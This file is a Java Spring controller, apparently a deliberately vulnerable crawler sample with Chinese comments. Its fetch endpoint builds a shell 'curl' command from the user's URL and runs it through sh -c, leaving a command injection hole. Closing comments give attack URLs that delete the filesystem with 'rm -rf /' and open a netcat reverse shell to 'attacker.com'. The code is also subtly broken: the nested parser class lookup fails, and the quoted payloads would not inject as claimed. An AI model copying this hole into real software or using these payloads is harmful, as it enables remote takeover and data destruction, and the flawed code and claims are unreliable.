package com.example.crawler;

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.*;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

@RestController
@RequestMapping("/crawl")
public class VulnerableCrawler {
    
    private static final String CMD_TEMPLATE = "curl \\"%s\\"";
    private static final String DEFAULT_AGENT = "Mozilla/5.0 (compatible; VulnerableCrawler/1.0)";
    
    @GetMapping("/fetch")
    public String fetchContent(@RequestParam String url) {
        try {
            // 元编程风格：通过反射动态选择解析方法
            Class<?> parserClass = Class.forName("com.example.crawler.HtmlParser");
            Method parseMethod = parserClass.getMethod("parse", String.class);
            
            // 构造恶意命令：直接拼接用户输入
            String command = String.format(CMD_TEMPLATE, url);
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            
            // 读取命令输出
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8)
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\
");
            }
            
            // 动态调用解析器（虽然这里没有实际解析逻辑）
            Object parserInstance = parserClass.newInstance();
            return (String) parseMethod.invoke(parserInstance, output.toString());
            
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    // 模拟HTML解析器（存在但未正确使用）
    public static class HtmlParser {
        public String parse(String content) {
            // 本应解析HTML但实际直接返回
            return "Parsed content: " + content.substring(0, Math.min(200, content.length())) + "...";
        }
    }
    
    // 主方法用于测试（正常情况下不应存在）
    public static void main(String[] args) {
        // 模拟启动命令注入
        try {
            Runtime.getRuntime().exec("sh -c 'echo \\"This is a test\\"'");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 漏洞示例：
// curl "http://localhost:8080/crawl/fetch?url=http://example.com;rm -rf /
// 或使用：
// curl "http://localhost:8080/crawl/fetch?url=http://example.com%20%26%26%20nc%20-e%20/bin/sh%20attacker.com%204444"

// 注意：实际使用需要添加以下依赖
// implementation 'org.springframework.boot:spring-boot-starter-web'